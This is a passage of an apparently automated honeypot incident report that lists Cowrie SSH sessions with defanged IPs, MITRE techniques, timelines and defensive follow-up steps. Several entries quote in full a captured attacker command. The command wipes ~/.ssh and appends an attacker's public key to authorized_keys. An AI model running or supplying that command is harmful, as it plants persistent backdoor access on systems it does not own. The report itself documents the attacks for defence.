| `2026-10-29 00:36:18` | `cowrie.command.failed` |
| `2026-10-29 00:36:18` | `cowrie.log.closed` |
| `2026-10-29 00:36:19` | `cowrie.session.params` |
| `2026-10-29 00:36:19` | `cowrie.command.input` |
| `2026-10-29 00:36:19` | `cowrie.session.file_download` |
| `2026-10-29 00:36:19` | `cowrie.log.closed` |
| `2026-10-29 00:36:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.172.214[.]224` to AbuseIPDB if not already reported
- [ ] Block `172.172.214[.]224` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ab8d12b24b13

| Field | Detail |
|---|---|
| **Source IP** | `172.172.214[.]224` |
| **First Seen** | 2026-10-29 00:36 |
| **Last Seen** | 2026-10-29 00:36 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-29 00:36:19` | `cowrie.session.connect` |
| `2026-10-29 00:36:19` | `cowrie.client.version` |
| `2026-10-29 00:36:19` | `cowrie.client.kex` |
| `2026-10-29 00:36:19` | `cowrie.login.success` |
| `2026-10-29 00:36:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.172.214[.]224` to AbuseIPDB if not already reported
- [ ] Block `172.172.214[.]224` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e8caf0e711a0

| Field | Detail |
|---|---|
| **Source IP** | `203.17.87[.]55` |
| **First Seen** | 2026-10-29 00:38 |
| **Last Seen** | 2026-10-29 00:38 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-29 00:38:40` | `cowrie.session.connect` |
| `2026-10-29 00:38:40` | `cowrie.client.version` |
| `2026-10-29 00:38:40` | `cowrie.client.kex` |
| `2026-10-29 00:38:41` | `cowrie.login.success` |
| `2026-10-29 00:38:43` | `cowrie.session.params` |
| `2026-10-29 00:38:43` | `cowrie.command.input` |
| `2026-10-29 00:38:43` | `cowrie.command.failed` |
| `2026-10-29 00:38:43` | `cowrie.log.closed` |
| `2026-10-29 00:38:44` | `cowrie.session.params` |
| `2026-10-29 00:38:44` | `cowrie.command.input` |
| `2026-10-29 00:38:44` | `cowrie.session.file_download` |
| `2026-10-29 00:38:44` | `cowrie.log.closed` |
| `2026-10-29 00:38:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.17.87[.]55` to AbuseIPDB if not already reported
- [ ] Block `203.17.87[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-94801b577a9e

| Field | Detail |
|---|---|
| **Source IP** | `203.17.87[.]55` |
| **First Seen** | 2026-10-29 00:38 |
| **Last Seen** | 2026-10-29 00:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-29 00:38:45` | `cowrie.session.connect` |
| `2026-10-29 00:38:45` | `cowrie.client.version` |
| `2026-10-29 00:38:45` | `cowrie.client.kex` |
| `2026-10-29 00:38:46` | `cowrie.login.success` |
| `2026-10-29 00:38:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.17.87[.]55` to AbuseIPDB if not already reported
- [ ] Block `203.17.87[.]55` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9d419f348d4f

| Field | Detail |
|---|---|
| **Source IP** | `177.10.203[.]106` |
| **First Seen** | 2026-10-29 00:39 |
| **Last Seen** | 2026-10-29 00:39 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-29 00:39:01` | `cowrie.session.connect` |
| `2026-10-29 00:39:01` | `cowrie.client.version` |
| `2026-10-29 00:39:01` | `cowrie.client.kex` |
| `2026-10-29 00:39:02` | `cowrie.login.success` |
| `2026-10-29 00:39:03` | `cowrie.session.params` |
| `2026-10-29 00:39:03` | `cowrie.command.input` |
| `2026-10-29 00:39:03` | `cowrie.command.failed` |
| `2026-10-29 00:39:03` | `cowrie.log.closed` |
| `2026-10-29 00:39:04` | `cowrie.session.params` |
| `2026-10-29 00:39:04` | `cowrie.command.input` |
| `2026-10-29 00:39:04` | `cowrie.session.file_download` |
| `2026-10-29 00:39:04` | `cowrie.log.closed` |
| `2026-10-29 00:39:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.10.203[.]106` to AbuseIPDB if not already reported
- [ ] Block `177.10.203[.]106` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dce368f3d8ae

| Field | Detail |
|---|---|
| **Source IP** | `177.10.203[.]106` |
| **First Seen** | 2026-10-29 00:39 |
| **Last Seen** | 2026-10-29 00:39 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-29 00:39:04` | `cowrie.session.connect` |
| `2026-10-29 00:39:04` | `cowrie.client.version` |
| `2026-10-29 00:39:04` | `cowrie.client.kex` |
| `2026-10-29 00:39:05` | `cowrie.login.success` |
| `2026-10-29 00:39:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.10.203[.]106` to AbuseIPDB if not already reported
- [ ] Block `177.10.203[.]106` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-042ecb4458bf

| Field | Detail |
|---|---|
| **Source IP** | `118.145.107[.]219` |
| **First Seen** | 2026-10-29 00:39 |
| **Last Seen** | 2026-10-29 00:44 |
| **Session Duration** | 247s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh` |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-29 00:39:59` | `cowrie.session.connect` |
| `2026-10-29 00:39:59` | `cowrie.client.version` |
| `2026-10-29 00:39:59` | `cowrie.client.kex` |
| `2026-10-29 00:40:00` | `cowrie.login.success` |
| `2026-10-29 00:40:01` | `cowrie.session.params` |
| `2026-10-29 00:40:01` | `cowrie.command.input` |
| `2026-10-29 00:40:01` | `cowrie.command.failed` |
| `2026-10-29 00:40:02` | `cowrie.log.closed` |
| `2026-10-29 00:44:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.145.107[.]219` to AbuseIPDB if not already reported
- [ ] Block `118.145.107[.]219` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-befded5f7453

| Field | Detail |
|---|---|
| **Source IP** | `118.145.107[.]219` |
| **First Seen** | 2026-10-29 00:40 |
| **Last Seen** | 2026-10-29 00:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-29 00:40:16` | `cowrie.session.connect` |
| `2026-10-29 00:40:16` | `cowrie.client.version` |
| `2026-10-29 00:40:16` | `cowrie.client.kex` |
| `2026-10-29 00:40:17` | `cowrie.login.success` |
| `2026-10-29 00:40:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.145.107[.]219` to AbuseIPDB if not already reported
- [ ] Block `118.145.107[.]219` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6a7edad6bc6c

| Field | Detail |
|---|---|
| **Source IP** | `88.142.46[.]185` |
| **First Seen** | 2026-10-29 00:40 |
| **Last Seen** | 2026-10-29 00:40 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-29 00:40:52` | `cowrie.session.connect` |
| `2026-10-29 00:40:52` | `cowrie.client.version` |
| `2026-10-29 00:40:52` | `cowrie.client.kex` |
| `2026-10-29 00:40:52` | `cowrie.login.success` |
| `2026-10-29 00:40:53` | `cowrie.session.params` |
| `2026-10-29 00:40:53` | `cowrie.command.input` |
| `2026-10-29 00:40:53` | `cowrie.command.failed` |
| `2026-10-29 00:40:53` | `cowrie.log.closed` |
| `2026-10-29 00:40:54` | `cowrie.session.params` |
| `2026-10-29 00:40:54` | `cowrie.command.input` |
| `2026-10-29 00:40:54` | `cowrie.session.file_download` |
| `2026-10-29 00:40:54` | `cowrie.log.closed` |
| `2026-10-29 00:40:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `88.142.46[.]185` to AbuseIPDB if not already reported
- [ ] Block `88.142.46[.]185` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0d66d067ee42

| Field | Detail |
|---|---|
| **Source IP** | `88.142.46[.]185` |
| **First Seen** | 2026-10-29 00:40 |
| **Last Seen** | 2026-10-29 00:40 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-29 00:40:54` | `cowrie.session.connect` |
| `2026-10-29 00:40:54` | `cowrie.client.version` |
| `2026-10-29 00:40:54` | `cowrie.client.kex` |
| `2026-10-29 00:40:55` | `cowrie.login.success` |
| `2026-10-29 00:40:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `88.142.46[.]185` to AbuseIPDB if not already reported
- [ ] Block `88.142.46[.]185` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0b066c7025fb

| Field | Detail |
|---|---|
| **Source IP** | `99.92.204[.]98` |
| **First Seen** | 2026-10-29 00:41 |
| **Last Seen** | 2026-10-29 00:41 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-29 00:41:56` | `cowrie.session.connect` |
| `2026-10-29 00:41:56` | `cowrie.client.version` |
| `2026-10-29 00:41:56` | `cowrie.client.kex` |
| `2026-10-29 00:41:56` | `cowrie.login.success` |
| `2026-10-29 00:41:57` | `cowrie.session.params` |
| `2026-10-29 00:41:57` | `cowrie.command.input` |
| `2026-10-29 00:41:57` | `cowrie.command.failed` |
| `2026-10-29 00:41:57` | `cowrie.log.closed` |
| `2026-10-29 00:41:58` | `cowrie.session.params` |
| `2026-10-29 00:41:58` | `cowrie.command.input` |
| `2026-10-29 00:41:58` | `cowrie.session.file_download` |
| `2026-10-29 00:41:58` | `cowrie.log.closed` |
| `2026-10-29 00:41:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `99.92.204[.]98` to AbuseIPDB if not already reported
- [ ] Block `99.92.204[.]98` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-22428e832b53

| Field | Detail |
|---|---|
| **Source IP** | `99.92.204[.]98` |
| **First Seen** | 2026-10-29 00:41 |
| **Last Seen** | 2026-10-29 00:41 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-29 00:41:58` | `cowrie.session.connect` |
| `2026-10-29 00:41:58` | `cowrie.client.version` |
| `2026-10-29 00:41:58` | `cowrie.client.kex` |
| `2026-10-29 00:41:58` | `cowrie.login.success` |
| `2026-10-29 00:41:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `99.92.204[.]98` to AbuseIPDB if not already reported
- [ ] Block `99.92.204[.]98` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### Additional priority cases (69) — compact view

| Case | Severity | Source IP | First Seen | Auth | Cmds | DL | TTPs |
|---|---|---|---|---|---|---|---|
| IR-a5cbeb078611 | HIGH | `115.178.75[.]243` | 2026-10-29 00:42 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-ae2f32d1136e | HIGH | `115.178.75[.]243` | 2026-10-29 00:42 | Y | 0 | 0 | `T1078 · T1592` |
| IR-36c50c11ea0f | HIGH | `129.121.139[.]180` | 2026-10-29 00:42 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-e996fcacd966 | HIGH | `129.121.139[.]180` | 2026-10-29 00:42 | Y | 0 | 0 | `T1078 · T1592` |
| IR-0156d8615c50 | HIGH | `125.20.165[.]213` | 2026-10-29 00:46 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-00586bc67b4b | HIGH | `125.20.165[.]213` | 2026-10-29 00:46 | Y | 0 | 0 | `T1078 · T1592` |
| IR-0c68dc9ecf69 | HIGH | `107.150.99[.]91` | 2026-10-29 00:49 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-be1dedda8800 | HIGH | `107.150.99[.]91` | 2026-10-29 00:49 | Y | 0 | 0 | `T1078 · T1592` |
| IR-a8c59a683f59 | HIGH | `118.145.246[.]43` | 2026-10-29 00:54 | Y | 1 | 0 | `T1078 · T1592` |
| IR-0a402fe4ef55 | HIGH | `47.251.81[.]121` | 2026-10-29 01:06 | Y | 2 | 0 | `T1078 · T1105` |
| IR-625f1c8cc453 | HIGH | `219.151.191[.]44` | 2026-10-29 01:09 | Y | 1 | 0 | `T1078 · T1592` |
| IR-9d73d6251299 | HIGH | `221.163.5[.]228` | 2026-10-29 01:15 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-69f03c8d6dc8 | HIGH | `221.163.5[.]228` | 2026-10-29 01:15 | Y | 0 | 0 | `T1078 · T1592` |
| IR-dfaecb4a4ad5 | HIGH | `122.160.151[.]175` | 2026-10-29 01:16 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-fbebb58247b4 | HIGH | `122.160.151[.]175` | 2026-10-29 01:16 | Y | 0 | 0 | `T1078 · T1592` |
| IR-db69f93a5ea6 | HIGH | `102.88.137[.]213` | 2026-10-29 01:17 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-eabecfc6e00a | HIGH | `102.88.137[.]213` | 2026-10-29 01:17 | Y | 0 | 0 | `T1078 · T1592` |
| IR-38076a4be748 | HIGH | `107.155.15[.]218` | 2026-10-29 01:23 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-5aabb52e7c22 | HIGH | `107.155.15[.]218` | 2026-10-29 01:23 | Y | 0 | 0 | `T1078 · T1592` |
| IR-654c50a66664 | HIGH | `36.64.131[.]68` | 2026-10-29 01:28 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-2ddf006905a9 | HIGH | `36.64.131[.]68` | 2026-10-29 01:28 | Y | 0 | 0 | `T1078 · T1592` |
| IR-06b8db34d289 | HIGH | `144.22.238[.]238` | 2026-10-29 01:29 | Y | 0 | 0 | `T1078 · T1592` |
| IR-62a8433eb0a0 | HIGH | `107.170.38[.]102` | 2026-10-29 01:52 | Y | 1 | 0 | `T1078 · T1592` |
| IR-f92aa0c3dc89 | HIGH | `180.93.193[.]100` | 2026-10-29 01:59 | Y | 4 | 0 | `T1078 · T1083` |
| IR-28dd91d4af4b | HIGH | `195.178.110[.]218` | 2026-10-29 02:01 | Y | 1 | 0 | `T1078 · T1592` |
| IR-8b3dcc900f8f | HIGH | `195.178.110[.]227` | 2026-10-29 02:08 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-14b85933a99b | HIGH | `195.178.110[.]227` | 2026-10-29 02:09 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-f1e3cf86e895 | HIGH | `195.178.110[.]227` | 2026-10-29 02:11 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-653ff3f85482 | HIGH | `195.178.110[.]227` | 2026-10-29 02:12 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-9e504ae7784b | HIGH | `195.178.110[.]227` | 2026-10-29 02:13 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-aa373b5d87b1 | HIGH | `34.76.107[.]249` | 2026-10-29 02:14 | Y | 2 | 0 | `T1078` |
| IR-582e750d5c0f | HIGH | `34.76.107[.]249` | 2026-10-29 02:14 | Y | 1 | 0 | `T1078` |
| IR-e51adae1b557 | HIGH | `34.76.107[.]249` | 2026-10-29 02:14 | Y | 0 | 0 | `T1078` |
| IR-6afcad472eb8 | HIGH | `195.178.110[.]227` | 2026-10-29 02:16 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-edd6ea266cdb | HIGH | `176.53.159[.]196` | 2026-10-29 02:17 | Y | 0 | 0 | `T1078 · T1592` |
| IR-a913dc99f13a | HIGH | `195.178.110[.]227` | 2026-10-29 02:18 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-f0992f7a218b | HIGH | `195.178.110[.]227` | 2026-10-29 02:19 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-f96c9484f003 | HIGH | `195.178.110[.]227` | 2026-10-29 02:21 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-a5f92574e40c | HIGH | `195.178.110[.]227` | 2026-10-29 02:22 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-6c6711e56e20 | HIGH | `195.178.110[.]227` | 2026-10-29 02:24 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-41af30181a07 | HIGH | `195.178.110[.]227` | 2026-10-29 02:26 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-d17f7531f0af | HIGH | `207.175.15[.]161` | 2026-10-29 02:27 | Y | 2 | 0 | `T1078` |
| IR-1181fcac3c26 | HIGH | `207.175.15[.]161` | 2026-10-29 02:27 | Y | 1 | 0 | `T1078` |
| IR-f28863c9d8ab | HIGH | `207.175.15[.]161` | 2026-10-29 02:27 | Y | 0 | 0 | `T1078` |
| IR-4d7ba519bd1f | HIGH | `195.178.110[.]227` | 2026-10-29 02:27 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-c2a47ea4ca3b | HIGH | `102.88.137[.]213` | 2026-10-29 02:32 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-60f5951f5ea5 | HIGH | `102.88.137[.]213` | 2026-10-29 02:32 | Y | 0 | 0 | `T1078 · T1592` |
| IR-765b0c687634 | HIGH | `91.92.199[.]36` | 2026-10-29 02:34 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-8378ce42a127 | HIGH | `91.92.199[.]36` | 2026-10-29 02:34 | Y | 0 | 0 | `T1078 · T1592` |
| IR-353f474b1c7d | HIGH | `189.203.163[.]10` | 2026-10-29 02:38 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-3cbd06ae8755 | HIGH | `189.203.163[.]10` | 2026-10-29 02:38 | Y | 0 | 0 | `T1078 · T1592` |
| IR-c2fe29e1be74 | HIGH | `140.233.190[.]80` | 2026-10-29 02:38 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-4c7e01b18a5c | HIGH | `140.233.190[.]80` | 2026-10-29 02:38 | Y | 0 | 0 | `T1078 · T1592` |
| IR-7ee082788024 | HIGH | `129.121.102[.]198` | 2026-10-29 02:39 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-db876a62a7f4 | HIGH | `129.121.102[.]198` | 2026-10-29 02:39 | Y | 0 | 0 | `T1078 · T1592` |
| IR-9a7ce0489bb9 | HIGH | `173.249.52[.]138` | 2026-10-29 02:39 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-bc164bd9b392 | HIGH | `173.249.52[.]138` | 2026-10-29 02:39 | Y | 0 | 0 | `T1078 · T1592` |
| IR-b794e1296ec2 | HIGH | `188.255.156[.]23` | 2026-10-29 02:40 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-902ab64a18d8 | HIGH | `188.255.156[.]23` | 2026-10-29 02:40 | Y | 0 | 0 | `T1078 · T1592` |
| IR-fd5411e97a5e | HIGH | `187.174.238[.]116` | 2026-10-29 02:40 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-5874c61c2da1 | HIGH | `187.174.238[.]116` | 2026-10-29 02:40 | Y | 0 | 0 | `T1078 · T1592` |
| IR-f82da3c28a87 | HIGH | `157.10.100[.]12` | 2026-10-29 02:43 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-9fe176cc596a | HIGH | `157.10.100[.]12` | 2026-10-29 02:43 | Y | 0 | 0 | `T1078 · T1592` |
| IR-d147a4a1734a | HIGH | `180.76.185[.]216` | 2026-10-29 02:44 | Y | 1 | 0 | `T1021.004 · T1078 · T1592` |
| IR-1fac61e79f64 | HIGH | `129.121.76[.]151` | 2026-10-29 02:48 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-61a73cc4552f | HIGH | `129.121.76[.]151` | 2026-10-29 02:48 | Y | 0 | 0 | `T1078 · T1592` |
| IR-0876b84dc81e | HIGH | `35.205.236[.]145` | 2026-10-29 02:53 | Y | 2 | 0 | `T1078` |
| IR-624a7883f3a7 | HIGH | `35.205.236[.]145` | 2026-10-29 02:53 | Y | 1 | 0 | `T1078` |
| IR-2d644a9618a5 | HIGH | `35.205.236[.]145` | 2026-10-29 02:53 | Y | 0 | 0 | `T1078` |

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `137.184.169[.]96` | **2** | 2026-10-29 01:37 | 2026-10-29 02:16 | 2m | 0 | `T1592` | 🟢 LOW |
| `195.178.110[.]218` | **2** | 2026-10-29 01:58 | 2026-10-29 02:01 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `101.200.216[.]59` | 1 | 2026-10-29 00:34 | 2026-10-29 00:36 | 120s | 0 | `T1592` | 🟢 LOW |
| `104.131.242[.]212` | 1 | 2026-10-29 00:09 | 2026-10-29 00:09 | 0s | 0 | `T1592` | 🟢 LOW |
| `107.170.38[.]102` | 1 | 2026-10-29 01:49 | 2026-10-29 01:49 | 0s | 0 | `T1592` | 🟢 LOW |
| `118.145.107[.]219` | 1 | 2026-10-29 00:40 | 2026-10-29 00:42 | 120s | 0 | `T1592` | 🟢 LOW |
| `118.145.246[.]43` | 1 | 2026-10-29 00:54 | 2026-10-29 00:54 | 0s | 0 | `T1592` | 🟢 LOW |
| `121.178.150[.]9` | 1 | 2026-10-29 01:56 | 2026-10-29 01:56 | 13s | 0 | `T1592` | 🟢 LOW |
| `121.189.244[.]35` | 1 | 2026-10-29 01:30 | 2026-10-29 01:30 | 26s | 0 | `T1592` | 🟢 LOW |
| `121.231.143[.]238` | 1 | 2026-10-29 01:14 | 2026-10-29 01:14 | 14s | 0 | `T1592` | 🟢 LOW |
| `138.68.53[.]50` | 1 | 2026-10-29 00:35 | 2026-10-29 00:35 | 12s | 0 | `T1592` | 🟢 LOW |
| `139.199.80[.]137` | 1 | 2026-10-29 00:10 | 2026-10-29 00:10 | 0s | 0 | `T1592` | 🟢 LOW |
| `139.199.80[.]137` | 1 | 2026-10-29 02:23 | 2026-10-29 02:23 | 0s | 0 | `T1592` | 🟢 LOW |
| `162.243.200[.]146` | 1 | 2026-10-29 00:25 | 2026-10-29 00:25 | 0s | 0 | `T1592` | 🟢 LOW |
| `162.243.51[.]139` | 1 | 2026-10-29 00:14 | 2026-10-29 00:14 | 0s | 0 | `T1592` | 🟢 LOW |
| `165.154.225[.]20` | 1 | 2026-10-29 00:37 | 2026-10-29 00:37 | 0s | 0 | `T1592` | 🟢 LOW |
